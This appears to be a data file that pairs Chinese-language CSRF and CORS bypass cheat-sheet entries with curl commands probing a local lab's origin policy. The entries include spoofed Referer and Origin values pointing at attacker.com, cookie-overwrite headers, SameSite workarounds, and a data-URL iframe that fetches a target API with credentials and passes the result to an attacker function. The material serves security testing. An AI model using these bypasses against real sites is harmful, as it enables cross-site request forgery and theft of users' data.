patches.expectedCommand:
# Token可预测
分析Token生成规律，预测有效Token

# Token未绑定会话
使用其他用户的Token

# Token重用
同一个Token可多次使用

# Token在GET参数中泄露
从页面源码获取Token

# 正则匹配不严谨
Referer: http://attacker.com/target.com/
Referer: http://target.com.attacker.com/

# 空Referer
<meta name="referrer" content="no-referrer">

# HTTPS->HTTP降级
从HTTPS站点跳转到HTTP不发送Referer
patches.command: for value in "https://allowed.invalid/" "https://allowed.invalid.attacker.invalid/" ""; do curl --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/lab/csrf/source-policy" ${value:+-H "Referer: $value"} --data "marker=CSRF_REFERER_MATRIX_B2" | jq -c '{referer,allowed,reason}'; done

patches.expectedCommand:
# Origin为null
使用data URL或about:blank

# 正则绕过
Origin: http://target.com.attacker.com
Origin: http://attacktarget.com

# IE11不发送Origin
IE11在某些情况下不发送Origin头
patches.command: for value in "https://allowed.invalid" "https://allowed.invalid.attacker.invalid" "null"; do curl --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/lab/csrf/source-policy" -H "Origin: $value" --data "marker=CSRF_ORIGIN_MATRIX_C3" | jq -c '{origin,allowed,reason}'; done

patches.expectedCommand:
# SameSite=Lax
GET请求会发送Cookie
构造GET形式的敏感操作

# SameSite未设置
默认行为可能允许跨站发送

# 两分钟窗口
SameSite=Lax有2分钟窗口期

# Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

# Access-Control-Allow-Origin: *
允许任意源

# 反射Origin
Access-Control-Allow-Origin: [任意Origin]
patches.command: for value in "https://allowed.invalid" "https://allowed.invalid.attacker.invalid" "null"; do curl --silent --show-error --max-time 5 "http://127.0.0.1:18080/lab/cors/policy" -H "Origin: $value" -D - -o /dev/null | grep -Ei "^(HTTP/|Access-Control-Allow-Origin:|Access-Control-Allow-Credentials:|Vary:)"; done

patches.expectedCommand:
# 发送测试请求
curl -H "Origin: http://attacker.com" http://target.com/api

# 检查响应头
Access-Control-Allow-Origin: http://attacker.com
Access-Control-Allow-Credentials: true

# 危险配置
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
patches.command: for value in "https://allowed.invalid" "https://cross-origin.invalid" "null"; do curl --silent --show-error --max-time 5 "http://127.0.0.1:18080/lab/cors/policy" -H "Origin: $value" -D - -o /dev/null | grep -Ei "^(HTTP/|Access-Control-Allow-Origin:|Access-Control-Allow-Credentials:|Vary:)"; done
pending

patches.expectedCommand:
# 允许null源
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

# 使用data URL
<iframe src="data:text/html,<script>
fetch('http://target.com/api', {credentials: 'include'})
.then(r => r.json()).then(sendToAttacker);
</script>"></iframe>

patches.command: for value in "https://allowed.invalid.attacker.invalid" "https://attackallowed.invalid" "https://allowed-invalid.example"; do curl --silent --show-error --max-time 5 "http://127.0.0.1:18080/lab/cors/policy" -H "Origin: $value" | jq -c '{origin,allowed,reason}'; done

<script>
fetch("http://127.0.0.1:18080/lab/cors/state-marker", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({marker: "CORS_POST_D4"})
}).then(response => document.body.dataset.status = String(response.status));
</script>

patches.expectedCommand: # GET请求绕过 构造GET形式的敏感操作 # 顶级导航 点击 window.location = "http://target.com/action" # 两分钟窗口 在用户交互后2分钟内发起请求

# 子域名攻击
从子域名发起请求
http://sub.target.com/attack

# Cookie覆盖
设置同名Cookie覆盖
Set-Cookie: session=attacker; Domain=.target.com

# 利用重定向
从目标站点重定向到攻击页面

# 旧浏览器默认行为
Chrome < 80 默认None
Safari 默认None

# 可直接发起CSRF攻击
无需特殊绕过

# OAuth回调绕过SameSite
1. 发起OAuth登录
2. 在回调中注入恶意请求
3. Cookie在OAuth流程中发送

# HTTPS->HTTP降级
从HTTPS站点发起HTTP请求
某些情况下不发送SameSite

# JavaScript重定向
location.href = "http://target.com/action"
可能绕过某些SameSite检查
